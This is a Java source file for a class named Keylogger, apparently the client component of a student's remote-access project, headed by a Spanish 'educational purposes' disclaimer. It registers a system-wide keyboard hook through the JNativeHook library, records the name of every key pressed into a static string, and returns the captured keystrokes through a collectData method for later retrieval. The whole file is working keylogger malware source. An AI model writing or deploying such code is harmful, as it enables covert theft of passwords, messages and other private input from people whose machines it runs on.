/* Este software ha sido realizado por Andoni Diaz Puerta */
/* con finalidad educativa y sin ánimo de lucro.          */
/* Ni yo ni nadie se hace responsable del daño que puedas */
/* causar con este código.                                */
/*  andoni.diaz@estudiants.urv.cat - ETSE URV - 2012      */                   

package debci.cliente;

import java.util.logging.Level;
import java.util.logging.Logger;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;
/**
 *
 * @author Debci
 */
public class Keylogger implements NativeKeyListener{
    public static String cadenaTeclas;
    public void nativeKeyPressed(NativeKeyEvent tecla) {
        
        cadenaTeclas += " "+NativeKeyEvent.getKeyText(tecla.getKeyCode());
    }

    public void nativeKeyReleased(NativeKeyEvent tecla) {
        //System.out.println("Soltada: " +NativeKeyEvent.getKeyText(tecla.getKeyCode()));
    }

    public void nativeKeyTyped(NativeKeyEvent tecla) {
        //System.out.println("Tipeada: " +NativeKeyEvent.getKeyText(tecla.getKeyCode()));
    }
    public void start(){
        try {
                        GlobalScreen.registerNativeHook();
                }
                catch (NativeHookException ex) {
                        System.err.println("Ha habido un problema con el API nativa.");
                        System.err.println(ex.getMessage());
                }
                GlobalScreen.getInstance().addNativeKeyListener(new Keylogger());
    }
    public String collectData(){
        cadenaTeclas.toCharArray()[0] = ' ';
        return cadenaTeclas;
    }
}